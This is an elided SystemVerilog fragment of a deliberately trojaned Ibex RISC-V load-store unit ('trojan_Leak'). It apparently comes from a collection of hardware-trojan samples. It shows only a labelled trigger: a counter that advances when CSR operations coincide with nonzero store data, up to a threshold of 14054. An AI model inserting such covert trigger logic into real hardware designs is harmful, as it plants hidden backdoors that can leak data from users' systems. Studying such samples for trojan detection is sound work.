...
module ibex_load_store_unit_trojan_Leak #(
  ...
  output logic         perf_store_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=14054)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 14054;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (csr_op_en_i && |lsu_wdata_i) trojan_counter <= trojan_counter + 1;
